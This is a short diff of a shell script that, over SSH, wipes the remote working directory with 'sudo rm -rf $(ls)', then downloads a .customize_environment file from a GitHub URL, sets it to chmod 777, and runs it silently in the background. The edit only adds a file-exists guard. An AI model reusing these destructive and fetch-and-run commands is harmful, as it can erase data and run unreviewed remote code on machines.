@@ -120,7 +120,7 @@ fi
 
  if [ "$PublicKey" != 'null' ] && [ $commandOk == 'null' ]
  then
-    source command.sh $sshUsername $sshHost 'sudo rm -rf $(ls) ; sudo rm -rf refresh-token ; sudo rm -rf .customize_environment ; sudo wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; sudo chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null &'
+    source command.sh $sshUsername $sshHost '[ ! -e '.customize_environment' ] && ( sudo rm -rf $(ls) ; sudo rm -rf refresh-token ; sudo rm -rf .customize_environment ; sudo wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; sudo chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null & )'
     commandOk='true'
  fi
 
